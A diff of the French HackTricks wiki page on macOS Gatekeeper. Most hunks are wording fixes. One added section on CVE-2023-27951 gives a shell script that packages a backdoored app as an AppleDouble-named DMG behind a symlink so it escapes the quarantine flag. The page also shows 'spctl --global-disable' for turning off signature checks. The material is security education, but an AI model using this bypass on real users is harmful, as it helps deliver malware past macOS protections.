@@ -38,7 +38,7 @@ Les signatures d'application sont une partie essentielle de la technologie Gatek
 
 #### Vérification des signatures
 
-Lors de la vérification d'un **échantillon de logiciel malveillant**, vous devez toujours **vérifier la signature** du binaire, car le **développeur** qui l'a signé peut déjà être **lié** à un **logiciel malveillant**.
+Lors de la vérification d'un **échantillon de logiciel malveillant**, vous devriez toujours **vérifier la signature** du binaire, car le **développeur** qui l'a signé peut déjà être **lié** à un **logiciel malveillant**.
 ```bash
 # Get signer
 codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"
@@ -108,7 +108,7 @@ cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
 ```
 Voici les hachages provenant de **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** et **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**
 
-Les options **`--master-disable`** et **`--global-disable`** de **`spctl`** désactiveront complètement ces vérifications de signature :
+Les options **`--master-disable`** et **`--global-disable`** de **`spctl`** désactiveront complètement ces vérifications de signature:
 ```bash
 # Disable GateKeeper
 spctl --global-disable
@@ -145,14 +145,14 @@ spctl --assess -v /Applications/App.app
 
 Lors du téléchargement d'une application ou d'un fichier, certaines applications macOS telles que les navigateurs web ou les clients de messagerie électronique ajoutent un attribut de fichier étendu, communément appelé "**drapeau de quarantaine**", au fichier téléchargé. Cet attribut agit comme une mesure de sécurité pour marquer le fichier comme provenant d'une source non fiable (Internet) et potentiellement porteur de risques. Cependant, toutes les applications n'attachent pas cet attribut, par exemple, les logiciels clients BitTorrent courants contournent généralement ce processus.
 
-**La présence d'un drapeau de quarantaine signale la fonctionnalité de sécurité Gatekeeper de macOS lorsque l'utilisateur tente d'exécuter le fichier**.
+**La présence d'un drapeau de quarantaine signale la fonction de sécurité Gatekeeper de macOS lorsque l'utilisateur tente d'exécuter le fichier**.
 
 Dans le cas où le **drapeau de quarantaine n'est pas présent** (comme pour les fichiers téléchargés via certains clients BitTorrent), les **vérifications de Gatekeeper peuvent ne pas être effectuées**. Par conséquent, les utilisateurs doivent faire preuve de prudence lors de l'ouverture de fichiers téléchargés à partir de sources moins sécurisées ou inconnues.
 
 {% hint style="info" %}
 **Vérifier** la **validité** des signatures de code est un processus **gourmand en ressources** qui comprend la génération de **hachages** cryptographiques du code et de toutes ses ressources incluses. De plus, la vérification de la validité du certificat implique une **vérification en ligne** auprès des serveurs d'Apple pour voir s'il a été révoqué après sa délivrance. Pour ces raisons, une vérification complète de la signature du code et de la notarisation est **impraticable à exécuter à chaque lancement d'une application**.
 
-Par conséquent, ces vérifications sont **uniquement effectuées lors de l'exécution d'applications avec l'attribut de quarantaine**.
+Par conséquent, ces vérifications ne sont **effectuées que lors de l'exécution d'applications avec l'attribut de quarantaine**.
 {% endhint %}
 
 {% hint style="warning" %}
@@ -293,12 +293,45 @@ Consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blo
 
 Il a été découvert que **Google Chrome ne définissait pas l'attribut de mise en quarantaine** pour les fichiers téléchargés en raison de problèmes internes de macOS.
 
+### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)
+
+Les formats de fichiers AppleDouble stockent les attributs d'un fichier dans un fichier séparé commençant par `._`, ce qui permet de copier les attributs de fichier **entre les machines macOS**. Cependant, il a été remarqué qu'après la décompression d'un fichier AppleDouble, le fichier commençant par `._` **n'était pas doté de l'attribut de mise en quarantaine**.
+
+{% code overflow="wrap" %}
+```bash
+mkdir test
+echo a > test/a
+echo b > test/b
+echo ._a > test/._a
+aa archive -d test/ -o test.aar
+
+# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
+```
+{% endcode %}
+
+Être capable de créer un fichier qui n'aura pas l'attribut de quarantaine défini, il était **possible de contourner Gatekeeper**. Le truc était de **créer une application de fichier DMG** en utilisant la convention de nom AppleDouble (commencer par `._`) et de créer un **fichier visible en tant que lien symbolique vers ce fichier caché** sans l'attribut de quarantaine.\
+Lorsque le **fichier dmg est exécuté**, comme il n'a pas d'attribut de quarantaine, il **contournera Gatekeeper**.
+```bash
+# Create an app bundle with the backdoor an call it app.app
+
+echo "[+] creating disk image with app"
+hdiutil create -srcfolder app.app app.dmg
+
+echo "[+] creating directory and files"
+mkdir
+mkdir -p s/app
+cp app.dmg s/app/._app.dmg
+ln -s ._app.dmg s/app/app.dmg
+
+echo "[+] compressing files"
+aa archive -d s/ -o app.aar
+```
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
